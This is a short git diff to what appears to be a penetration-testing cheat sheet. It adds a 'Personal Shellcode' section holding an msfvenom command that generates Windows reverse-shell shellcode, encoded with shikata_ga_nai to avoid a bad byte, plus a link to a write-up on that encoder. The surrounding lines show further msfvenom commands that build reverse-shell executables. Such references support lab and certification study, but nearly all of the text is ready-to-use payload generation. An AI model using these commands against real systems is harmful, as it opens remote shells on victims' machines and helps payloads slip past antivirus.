@@ -31,6 +31,12 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
 ```
 
+### Personal Shellcode
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -f py -v SHELLCODE –e x86/shikata_ga_nai -b "\x3E"
+```
+- https://marcosvalle.github.io/re/exploit/2018/08/25/shikata-ga-nai.html
+
 ### Linux
 #### .elf x86 staged - msfvenom (Non-Meterpreter)
 ```bash
